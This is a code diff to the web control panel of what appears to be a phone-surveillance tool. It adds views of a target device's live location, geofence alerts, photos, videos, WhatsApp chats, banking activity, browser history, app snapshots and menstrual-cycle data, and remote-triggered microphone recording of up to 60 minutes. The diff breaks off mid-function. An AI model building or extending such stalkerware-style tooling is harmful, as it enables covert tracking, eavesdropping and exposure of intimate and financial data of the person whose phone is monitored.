@@ -202,6 +202,22 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 .wifi-prev-header:hover{color:var(--accent)}
 .wifi-prev-body{overflow:hidden;transition:max-height .2s}
 .wifi-prev-body.closed{max-height:0!important}
+@keyframes shimmer{0%{background-position:-200px 0}100%{background-position:calc(200px + 100%) 0}}
+.skel{background:linear-gradient(90deg,var(--card) 25%,var(--border) 50%,var(--card) 75%);background-size:200px 100%;animation:shimmer 1.5s infinite;border-radius:4px}
+.skel-line{height:14px;margin-bottom:8px;width:100%}
+.skel-line.w50{width:50%}
+.skel-line.w30{width:30%}
+.skel-block{height:80px;width:100%;margin-bottom:8px}
+.photo-grid .pwrap:hover .photo-select{display:block!important}
+.photo-grid .pwrap.selected{border-color:var(--accent)!important;outline:2px solid var(--accent)}
+.skel-card{background:var(--card);border-radius:var(--radius);padding:12px;border-left:3px solid var(--border)}
+canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6px;margin:4px 0}
+.global-search{display:flex;align-items:center;gap:6px;margin-left:auto}
+.global-search input{padding:5px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;width:160px;transition:border-color .15s}
+.global-search input:focus{outline:none;border-color:var(--accent);width:220px}
+.global-search input::placeholder{color:var(--muted);font-size:11px}
+@media(max-width:720px){.global-search{width:100%;margin:4px 0 0}.global-search input{width:100%}.global-search input:focus{width:100%}}
+#globalSearchResults{position:absolute;top:100%;left:0;right:0;z-index:9999;background:var(--card);border:1px solid var(--border);border-radius:var(--radius);max-height:60vh;overflow-y:auto;display:none;box-shadow:0 8px 24px rgba(0,0,0,.5)}.header{position:relative}
 </style>
 </head>
 <body>
@@ -211,12 +227,15 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <span class="status" id="statusDot">&#x25CF; Live</span>
 <span class="read-budget" id="readBudget"></span>
 <span class="read-budget" id="queueBadge" style="color:var(--accent);cursor:pointer;margin-left:6px" title="Pending offline queue size">&#x1F4E2; 0</span>
+<div class="global-search"><input type="text" id="globalSearch" placeholder="&#x1F50D; Search all data..." title="Search across all tabs"><div id="globalSearchResults"></div></div>
 </div>
 <div class="alert-banner" id="alertBanner"></div>
 <div class="sidebar">
 <div class="tabs" id="tabBar">
 <button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
+<button class="tab-btn" data-tab="recents">&#x23F1; Recents</button>
 <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
+<button class="tab-btn" data-tab="videos">&#x1F3AC; Videos</button>
 <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
 <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
 <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
@@ -261,11 +280,62 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
     <div><span class="label" style="font-size:12px">SIM</span><br><span id="liveSimVal" style="font-weight:500">--</span></div>
   </div>
 </div>
+<div id="statusWidget" style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swBattery">&#x1F50B; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swStorage">&#x1F4BE; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swSteps">&#x1F45F; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swWifi">&#x1F4E1; --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swSignal"><span class="wifi-signal"></span> --</span>
+</div>
+</div>
+<div id="tab-recents">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:16px;font-weight:500">&#x23F1; App Snapshots <span id="recentsCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
+<div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap">
+<label style="display:flex;align-items:center;gap:4px;font-size:13px;color:var(--muted);cursor:pointer">
+<input type="checkbox" id="recentsDedupToggle" checked> Dedup (1s)
+</label>
+<select id="recentsTimeRange" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:4px 8px;border-radius:6px;font-size:13px;min-height:28px">
+<option value="1h">Last 1 Hour</option>
+<option value="6h">Last 6 Hours</option>
+<option value="12h">Last 12 Hours</option>
+<option value="24h" selected>Last 24 Hours</option>
+<option value="7d">Last 7 Days</option>
+<option value="30d">Last 30 Days</option>
+<option value="all">All Time</option>
+</select>
+</div>
+<div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap">
+<input type="text" id="recentsSearch" placeholder="&#x1F50D; Search app name, package..." style="flex:1;min-width:180px;padding:6px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;font-size:14px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="exportRecentsCSV()">&#x1F4E5; Export CSV</span>
+<span class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:13px;cursor:pointer" onclick="clearRecents()">&#x1F5D1; Clear All</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollAppSnapshots()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div id="recentsList"><div class="label">Click Refresh to load app snapshots</div></div>
+</div>
+<div id="tab-browser">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+  <span style="font-size:14px;font-weight:500">&#x1F310; Browser History</span>
+  <span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer" onclick="pollBrowserHistory()">&#x1F504; Refresh</span>
+</div>
+<div class="filter-chips" id="browserChips" style="margin-bottom:6px">
+  <span class="chip active" data-browser="all">All</span>
+  <span class="chip" data-browser="chrome">Chrome</span>
+  <span class="chip" data-browser="firefox">Firefox</span>
+  <span class="chip" data-browser="samsung">Samsung</span>
+  <span class="chip" data-browser="huawei">Huawei</span>
+  <span class="chip" data-browser="other">Other</span>
+</div>
+<input type="text" id="browserSearch" placeholder="&#x1F50D; Search titles, URLs..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;font-size:12px;margin-bottom:8px">
+<div id="browserList"><div class="label">No browsing history yet</div></div>
 </div>
 <div id="tab-photos">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
 <span style="font-size:16px;font-weight:500">&#x1F4F8; Photos <span id="photoCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
 <div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" id="btnSelectAllPhotos">&#x1F4CB; Select All</span>
+<span class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:13px;cursor:pointer" id="btnDeleteSelectedPhotos" onclick="deleteSelectedPhotos()">&#x1F5D1; Delete Selected</span>
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="loadAllPhotos()">&#x1F4C2; Load All</span>
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="photoOffset=0;cachedPhotos={};pollPhotos()">&#x1F504; Refresh</span>
 </div>
@@ -273,13 +343,50 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 <div id="photoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F4F8; Click the Photos tab to load</div></div>
 <div id="loadMoreContainer"></div>
 </div>
+<div id="tab-videos">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
+<span style="font-size:16px;font-weight:500">&#x1F3AC; Videos <span id="videoCount" style="font-weight:400;color:var(--muted);font-size:14px"></span></span>
+<div style="display:flex;gap:6px">
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="loadAllVideos()">&#x1F4C2; Load All</span>
+<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="videoOffset=0;cachedVideos={};pollVideos()">&#x1F504; Refresh</span>
+</div>
+</div>
+<div class="filter-chips" id="videoSourceChips">
+<span class="chip active" data-vsource="all">All</span>
+<span class="chip" data-vsource="camera">&#x1F4F7; Camera</span>
+<span class="chip" data-vsource="whatsapp">&#x1F4AC; WhatsApp</span>
+<span class="chip" data-vsource="telegram">&#x2709; Telegram</span>
+<span class="chip" data-vsource="download">&#x1F4E5; Downloads</span>
+<span class="chip" data-vsource="screen_recording">&#x1F4FD; Screen</span>
+<span class="chip" data-vsource="other">&#x1F4C1; Other</span>
+</div>
+<div id="videoGrid" class="photo-grid"><div class="label" style="margin:20px 0">&#x1F3AC; No videos synced yet</div></div>
+<div id="videoLoadMoreContainer"></div>
+</div>
 <div id="tab-timeline">
 <div class="filter-chips" id="timelineChips">
 <span class="chip active" data-filter="all" data-label="All">All</span>
 <span class="chip" data-filter="location" data-label="&#x1F4CD; Location">&#x1F4CD; Location</span>
 <span class="chip" data-filter="call" data-label="&#x1F4DE; Call">&#x1F4DE; Call</span>
-<span class="chip" data-filter="whatsapp" data-label="&#x1F4AC; WhatsApp">&#x1F4AC; WhatsApp</span>
+<span class="chip" data-filter="whatsapp_individual" data-label="&#x1F4AC; Individual">&#x1F4AC; Individual</span>
+<span class="chip" data-filter="whatsapp_group" data-label="&#x1F465; Groups">&#x1F465; Groups</span>
 <span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat">&#x1F4F8; Snapchat</span>
+<span class="chip" data-filter="banking" data-label="&#x1F4B3; Banking">&#x1F4B3; Banking</span>
+</div>
+<div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
+<select id="timelinePeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
+<option value="all">All Time</option>
+<option value="1h">Last 1 Hour</option>
+<option value="6h">Last 6 Hours</option>
+<option value="12h">Last 12 Hours</option>
+<option value="24h" selected>Last 24 Hours</option>
+<option value="7d">Last 7 Days</option>
+<option value="30d">Last 30 Days</option>
+</select>
+<label style="display:flex;align-items:center;gap:4px;font-size:13px;color:var(--muted);cursor:pointer">
+<input type="checkbox" id="dedupToggle"> Dedup (10s)
+</label>
+<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:13px" onclick="clearTimeline()">&#x1F5D1; Clear Timeline</button>
 </div>
 <input type="text" id="timelineSearch" placeholder="&#x1F50D; Search contacts, numbers, messages..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
 <div id="timelineList"></div>
@@ -300,7 +407,12 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
     <button class="chip" id="removeHomeBtn" style="border-color:var(--danger);color:var(--danger);font-size:13px">Remove Home</button>
   </div>
 </div>
-<div id="geofenceList"></div></div>
+<div id="geofenceList"></div>
+<div style="margin-top:12px;border-top:1px solid var(--border);padding-top:10px">
+<div style="font-size:15px;font-weight:500;margin-bottom:6px">&#x1F514; Alert History</div>
+<div id="geofenceAlertLog" style="max-height:200px;overflow-y:auto;font-size:12px;color:var(--muted)"><div class="label">No alerts yet</div></div>
+</div>
+</div>
 <div id="tab-fcm">
 <div class="card" style="border-left-color:var(--accent);padding:12px">
   <div style="font-size:15px;font-weight:500;margin-bottom:8px">&#x1F4E1; Remote Sync Trigger</div>
@@ -331,13 +443,52 @@ body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;he
 </div>
 <div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
 <div id="tab-remote">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
-<span style="font-size:16px;font-weight:500">&#x1F3A4; Remote Recordings</span>
-<span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollRemoteRecordings()">&#x1F504; Refresh</span>
+<div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
+<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+<span style="font-size:13px;font-weight:500;color:var(--text)">&#x1F3A4; Remote Recording</span>
+<select id="remote-voiceDeviceSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px;min-width:160px" onchange="if(this.value){recordingDevice=this.value;selectedDevice=this.value;localStorage.setItem('selectedDevice',selectedDevice);document.getElementById('deviceSelect').value=this.value;pollRemoteRecordings();}"><option value="">Select device...</option></select>
+<span class="chip" style="background:var(--accent);color:#000;font-size:11px;cursor:pointer;margin-left:auto" onclick="pollRemoteRecordings()">&#x1F504; Refresh</span>
+<select id="remote-recDuration" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px">
+<option value="60">1 min</option>
+<option value="120">2 min</option>
+<option value="300" selected>5 min</option>
+<option value="600">10 min</option>
+<option value="1800">30 min</option>
+<option value="3600">60 min</option>
+</select>
+<button id="remote-btnStartRecord" class="pb-btn" style="background:var(--danger);color:#fff;font-weight:600" onclick="startRemoteRecordingRemote()">
+<span>&#x1F399; Start Recording</span>
+</button>
+<button id="remote-btnCancelRecord" class="pb-btn" style="background:var(--warning);color:#000;font-weight:600;display:none" onclick="cancelRemoteRecordingRemote()">
+<span>&#x23F9; Stop Recording</span>
+</button>
+<div id="remote-recStatus" style="font-size:12px;color:var(--muted);margin-left:auto"></div>
 </div>
+<div id="remote-recProgress" style="display:none;margin-top:8px">
+<div style="font-size:11px;color:var(--muted);margin-bottom:4px;display:flex;align-items:center;gap:8px">
+<span>Progress:</span>
+<progress id="remote-recProgressBar" value="0" max="100" style="flex:1;height:6px"></progress>
+<span id="remote-recProgressLabel" style="min-width:100px"></span>
+<span id="remote-recProgressTime"></span>
+<span id="remote-recProgressSegments"></span>
+<span id="remote-recProgressFormat"></span>
+</div>
+<div id="remote-recProgressCancel" style="display:block;margin-top:4px">
+<button class="chip" style="background:var(--warning);color:#000;font-size:11px" onclick="cancelRemoteRecordingRemote()">&#x23F9; Stop</button>
+</div>
+</div>
+</div>
+
 <div style="font-size:13px;color:var(--muted);margin-bottom:8px">
 On-demand mic recordings triggered from the dashboard. Segments are auto-assembled into a single playable file.
 </div>
+
+<div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap">
+<button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(7)">&#x1F5D1; Cleanup older than 7 days</button>
+<button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(30)">&#x1F5D1; Cleanup older than 30 days</button>
+<button class="chip" style="background:var(--card);color:var(--text);border-color:var(--border)" onclick="cleanupOldRecordings(1)">&#x1F5D1; Cleanup older than 1 day</button>
+</div>
+
 <div id="remoteRecordingsList"><div class="label">No remote recordings yet</div></div>
 </div>
 <div id="tab-insights">
@@ -371,22 +522,6 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
   <div id="cleanupActions" style="display:flex;flex-direction:column;gap:6px"></div>
 </div>
 </div>
-<div id="tab-browser">
-<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
-  <span style="font-size:16px;font-weight:500">&#x1F310; Browser History</span>
-  <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollBrowserHistory()">&#x1F504; Refresh</span>
-</div>
-<div class="filter-chips" id="browserChips" style="margin-bottom:6px">
-  <span class="chip active" data-browser="all">All</span>
-  <span class="chip" data-browser="chrome">Chrome</span>
-  <span class="chip" data-browser="firefox">Firefox</span>
-  <span class="chip" data-browser="samsung">Samsung</span>
-  <span class="chip" data-browser="huawei">Huawei</span>
-  <span class="chip" data-browser="other">Other</span>
-</div>
-<input type="text" id="browserSearch" placeholder="&#x1F50D; Search titles, URLs..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
-<div id="browserList"><div class="label">No browsing history yet</div></div>
-</div>
 <div id="tab-permissions">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
   <span style="font-size:16px;font-weight:500">&#x1F512; App Permissions</span>
@@ -411,6 +546,7 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div style="display:flex;gap:6px">
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="pollLogcat()">&#x1F504; Refresh</span>
 <span class="chip" style="background:var(--accent);color:#000;font-size:13px;cursor:pointer" onclick="clearLogcat()">&#x1F5D1; Clear</span>
+<span class="chip" style="background:var(--border);color:var(--text);font-size:13px;cursor:pointer" onclick="collapseAllLogcat()">&#x1F4C1; Collapse All</span>
 </div>
 </div>
 <div style="display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap">
@@ -449,15 +585,35 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 </div>
 </div>
 <div style="margin-top:12px">
-<div class="label">&#x1F4C5; Step History (Last 7 Days)</div>
-<div id="healthStepChart" style="display:flex;gap:4px;align-items:flex-end;height:100px;padding:8px 4px;border:1px solid var(--border);border-radius:6px;margin-top:4px">
-<div class="label" style="width:100%;text-align:center;color:var(--muted)">Loading...</div>
-</div>
+<div class="label">&#x1F4C5; Step History (Last 7 Days) <span style="font-weight:400;color:var(--muted);font-size:13px;cursor:pointer" onclick="exportStepChart()">&#x1F4E5; Export</span></div>
+<canvas id="healthStepCanvas" class="chart-canvas"></canvas>
 </div>
 <div style="margin-top:12px">
 <div class="label">&#x1F3C3; Activity Timeline</div>
 <div id="healthActivityTimeline" style="max-height:200px;overflow-y:auto;margin-top:4px">
 <div class="label" style="color:var(--muted)">No activity data yet</div>
+</div>
+</div>
+<div style="margin-top:16px" id="haidhSection">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+<span class="label">&#x1F4B8; Menstrual Cycle</span>
+<span id="haidhLastSync" style="font-size:13px;color:var(--muted)"></span>
+</div>
+<div id="haidhSummary" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:12px"></div>
+<div style="margin-top:12px">
+<div class="label">&#x1F4C5; Cycle Calendar (Previous + Current Month)</div>
+<div id="haidhCalendarContainer"></div>
+</div>
+</div>
+<div style="margin-top:16px" id="exerciseSection">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+<span class="label">&#x1F3CB;&#xFE0F; Exercise</span>
+<span id="exerciseLastSync" style="font-size:13px;color:var(--muted)"></span>
+</div>
+<div id="exerciseSummary" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;margin-bottom:12px"></div>
+<div style="margin-top:12px">
+<div class="label">&#x1F4C5; Exercise Calendar (Previous + Current Month)</div>
+<div id="exerciseCalendarContainer"></div>
 </div>
 </div>
 </div>
@@ -550,6 +706,11 @@ Recorded phone calls (encrypted, segmented every 60s). Segments are reassembled 
 </div>
 </div>
 <div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""><div id="lightboxCaption" style="position:absolute;bottom:0;left:0;right:0;background:linear-gradient(transparent,rgba(0,0,0,.85));padding:30px 14px 10px;color:#eee;font-size:14px;text-align:center;pointer-events:none"></div></div>
+<div class="lightbox" id="videoPlayerOverlay" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999;justify-content:center;align-items:center;flex-direction:column;padding:20px">
+<button style="position:absolute;top:16px;right:16px;background:none;border:none;color:#fff;font-size:28px;cursor:pointer;z-index:10" onclick="closeVideoPlayer()">&times;</button>
+<video id="videoPlayer" controls style="max-width:100%;max-height:85vh;border-radius:8px" playsinline></video>
+<div id="videoPlayerMeta" style="color:var(--muted);font-size:12px;margin-top:8px;text-align:center"></div>
+</div>
 
 <script>
 // --- Firebase Config ---
@@ -561,11 +722,38 @@ const PKT = 'Asia/Karachi';
 // --- State ---
 let devices = {};
 let selectedDevice = null;
+let recordingDevice = null;
+let _remoteRecordingActive = false;
 let locationHistory = [];
 let historyAutoLoaded = false;
 let marker, accuracyCircle, trail;
 let geofences = [];
-let alertedZones = new Set();
+let geofenceAlertLog = JSON.parse(localStorage.getItem('geofenceAlertLog') || '[]');
+
+function addGeofenceAlert(msg) {
+  const entry = { msg, ts: Date.now() };
+  geofenceAlertLog.unshift(entry);
+  if (geofenceAlertLog.length > 50) geofenceAlertLog.pop();
+  localStorage.setItem('geofenceAlertLog', JSON.stringify(geofenceAlertLog));
+  const el = document.getElementById('geofenceAlertLog');
+  if (el) {
+    const existing = el.querySelector('.geofence-alerts') || el;
+    if (existing === el) el.innerHTML = '';
+    const div = document.createElement('div');
+    div.style.cssText = 'padding:3px 0;border-bottom:1px solid var(--border)';
+    div.innerHTML = `<span style="color:var(--accent)">${pktShort(Date.now())}</span> \u{1F514} ${escHtml(msg)}`;
+    el.insertBefore(div, el.firstChild);
+    if (el.children.length > 50) el.removeChild(el.lastChild);
+  }
+}
+
+function renderGeofenceAlertLog() {
+  const el = document.getElementById('geofenceAlertLog');
+  if (!el) return;
+  el.innerHTML = geofenceAlertLog.length ? geofenceAlertLog.map(e =>
+    `<div style="padding:3px 0;border-bottom:1px solid var(--border);font-size:12px"><span style="color:var(--accent)">${pktShort(e.ts)}</span> \u{1F514} ${escHtml(e.msg)}</div>`
+  ).join('') : '<div class="label">No alerts yet</div>';
+}
 let readBudget = (() => { try { return JSON.parse(localStorage.getItem('readBudget') || '{"count":0,"day":""}'); } catch { return { count: 0, day: '' }; } })();
 let cachedPhotos = {};
 let appsCache = null;
@@ -580,6 +768,20 @@ let timelineCache = null;
 let contactsCache = null;
 let contactsSyncTs = 0;
 let nomProcessing = false;
+let videoKeys = [];
+let videoOffset = 0;
+const VIDEO_BATCH = 24;
+let videoLoading = false;
+let videoSourceFilter = 'all';
+let cachedVideos = {};
+let recentsTimeRange = '24h';
+let recentsSearchQuery = '';
+let recentsGroupedState = JSON.parse(localStorage.getItem('recentsGrouped') || '{}');
+let timelinePeriod = '24h';
+let timelineOffset = 0;
+const TIMELINE_BATCH = 500;
+let haidhCache = null;
+let exerciseCache = null;
 
 function loadGeofences(deviceId) {
   if (!deviceId) { geofences = []; renderGeofences(); renderGeofenceList(); return; }
@@ -602,61 +804,9 @@ let playbackPoints = [];
 let playbackDirection = 1;
 let playbackLoop = false;
 
-// --- Remote Recording Segment Players ---
-const segPlayerData = new Map();
-
-function segPlay(segId, total) {
-  const audio = document.getElementById('segAudio_' + segId);
-  if (!audio) return;
-  const uris = audio.dataset.uris.split('||');
-  let idx = parseInt(audio.dataset.segIdx || '0');
-  if (idx >= total) { idx = 0; audio.dataset.segIdx = '0'; }
-  const btn = document.getElementById('segBtn_' + segId);
-  audio.src = uris[idx].replace(/&quot;/g, '"');
-  audio.dataset.segIdx = String(idx);
-  audio.play();
-  if (btn) btn.textContent = '\u23F8';
-  updateSegLabel(segId, idx, total);
-  audio.onended = function() { segNext(segId, total); };
-  audio.ontimeupdate = function() { updateSegTime(segId, audio); };
-}
-
-function segNext(segId, total) {
-  const audio = document.getElementById('segAudio_' + segId);
-  if (!audio) return;
-  const uris = audio.dataset.uris.split('||');
-  let idx = parseInt(audio.dataset.segIdx || '0') + 1;
-  const bar = document.getElementById('segBar_' + segId + '_' + (idx - 1));
-  if (bar) bar.style.background = 'var(--accent)';
-  if (idx >= total) {
-    audio.dataset.segIdx = '0';
-    const btn = document.getElementById('segBtn_' + segId);
-    if (btn) btn.textContent = '\u25B6';
-    updateSegLabel(segId, 0, total);
-    return;
-  }
-  audio.src = uris[idx].replace(/&quot;/g, '"');
-  audio.dataset.segIdx = String(idx);
-  audio.play();
-  updateSegLabel(segId, idx, total);
-}
-
-function updateSegLabel(segId, idx, total) {
-  const label = document.getElementById('segLabel_' + segId);
-  if (label) label.textContent = (idx + 1) + '/' + total;
-}
-
-function updateSegTime(segId, audio) {
-  const el = document.getElementById('segTime_' + segId);
-  if (!el || !audio || !audio.duration) return;
-  const cur = Math.floor(audio.currentTime);
-  const dur = Math.floor(audio.duration);
-  el.textContent = Math.floor(cur / 60) + ':' + String(cur % 60).padStart(2, '0') + ' / ' +
-    Math.floor(dur / 60) + ':' + String(dur % 60).padStart(2, '0');
-}
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -706,7 +856,8 @@ function geocode(lat, lng) {
   const key = lat.toFixed(3) + ',' + lng.toFixed(3);
   if (cachedAddresses[key]) return Promise.resolve(cachedAddresses[key]);
   return new Promise(resolve => {
-    nomQueue.push({ lat, lng, key, resolve });
+    if (nomQueue.length < 100) nomQueue.push({ lat, lng, key, resolve });
+    else resolve(null);
     if (!nomProcessing) processNomQueue();
   });
 }
@@ -806,7 +957,7 @@ function renderGeofences() {
   map.eachLayer(l => { if (l._isGeofence) map.removeLayer(l); });
   geofences.filter(g => g.active).forEach(g => {
     L.circle([g.lat, g.lng], { radius: g.radius, color: '#ffca28', fillOpacity: 0.1, dashArray: '5,10' })
-      ._isGeofence = true;
+      .addTo(map)._isGeofence = true;
   });
 }
 
@@ -822,8 +973,9 @@ function checkGeofences(lat, lng) {
     const dist = haversine(lat, lng, g.lat, g.lng);
     const inside = dist <= g.radius;
     if (inside && !alertedZones.has(g.id)) {
-      sendNotification('Geofence: ' + g.name, 'Device entered ' + g.name);
       alertedZones.add(g.id);
+      addGeofenceAlert(g.name + ' entered');
+      sendNotification('Geofence: ' + g.name, 'Device entered ' + g.name);
     } else if (!inside) alertedZones.delete(g.id);
   });
 }
@@ -923,6 +1075,8 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
     if (btn.dataset.tab === 'browser') pollBrowserHistory();
     if (btn.dataset.tab === 'permissions') { if (window.permCache) renderPermissions(); else pollPermissions(); }
     if (btn.dataset.tab === 'photos') pollPhotos();
+    if (btn.dataset.tab === 'videos') pollVideos();
+    if (btn.dataset.tab === 'recents') pollAppSnapshots();
     if (btn.dataset.tab === 'wifi') pollWifiScans();
     if (btn.dataset.tab === 'logcat') pollLogcat();
     if (btn.dataset.tab === 'health') pollHealth();
@@ -933,12 +1087,353 @@ document.querySelectorAll('.tab-btn').forEach(btn => {
 // --- Tab-aware polling ---
 document.addEventListener('visibilitychange', () => {
   if (document.hidden) { stopPolling(); }
-  else { startPolling(); pollAll(); }
+  else { startPolling(); }
+});
+
+// --- Recents Tab ---
+function renderRecents() {
+  const list = document.getElementById('recentsList');
+  const countEl = document.getElementById('recentsCount');
+  if (!appSnapshotsCache || !appSnapshotsCache.length) {
+    list.innerHTML = '<div class="label">No app snapshots yet. Captured every 30s by the phone.</div>';
+    if (countEl) countEl.textContent = '';
+    return;
+  }
+  const dedupEnabled = localStorage.getItem('recentsDedup') !== 'false';
+  const dedupToggle = document.getElementById('recentsDedupToggle');
+  if (dedupToggle) dedupToggle.checked = dedupEnabled;
+  const now = Date.now();
+  const timeRangeMs = { '1h': 3600000, '6h': 21600000, '12h': 43200000, '24h': 86400000, '7d': 604800000, '30d': 2592000000, 'all': Infinity };
+  const cutoff = now - (timeRangeMs[recentsTimeRange] || timeRangeMs['24h']);
+  const searchLower = recentsSearchQuery.toLowerCase();
+  let filtered = appSnapshotsCache.filter(s => {
+    if (s.phoneTsMs < cutoff) return false;
+    if (searchLower && !s.appName.toLowerCase().includes(searchLower) && !(s.packageName || '').toLowerCase().includes(searchLower)) return false;
+    return true;
+  });
+  let deduped = filtered;
+  if (dedupEnabled) {
+    const seen = new Set();
+    deduped = filtered.filter(s => {
+      const key = s.appName + '|' + s.phoneTsMs;
+      if (seen.has(key)) return false;
+      seen.add(key);
+      return true;
+    });
+  }
+  if (countEl) {
+    countEl.textContent = deduped.length + ' entries' + (filtered.length !== deduped.length ? ' (' + filtered.length + ' filtered)' : '');
+    if (appSnapshotsCache.length > 0) {
+      const lastSync = appSnapshotsCache[0].dashboardTsMs || appSnapshotsCache[0].phoneTsMs;
+      if (lastSync && lastSync > 0) countEl.textContent += ' \u00B7 Sync: ' + pktShort(lastSync);
+    }
+  }
+  let html = '';
+  for (const s of deduped) {
+    let chips = '';
+    if (s.batteryPct != null) {
+      const batColor = s.batteryPct < 20 ? 'var(--danger)' : s.batteryPct < 50 ? 'var(--accent)' : 'var(--success)';
+      chips += `<span class="chip" style="font-size:9px;padding:1px 6px;background:${batColor};color:#000;border-color:transparent">\u{1F50B} ${s.batteryPct}%${s.isCharging ? ' \u26A1' : ''}</span> `;
+    }
+    if (s.idleTimeMs != null) {
+      const idleMin = Math.floor(s.idleTimeMs / 60000);
+      const idleSec = Math.floor((s.idleTimeMs % 60000) / 1000);
+      const idleStr = idleMin > 0 ? `${idleMin}m ${idleSec}s` : `${idleSec}s`;
+      const idleColor = s.idleTimeMs > 300000 ? 'var(--danger)' : s.idleTimeMs > 60000 ? 'var(--accent)' : 'var(--success)';
+      chips += `<span class="chip" style="font-size:9px;padding:1px 6px;border-color:${idleColor};color:${idleColor}">\u{23F3} ${idleStr} idle</span> `;
+    }
+    if (s.screenOn != null) {
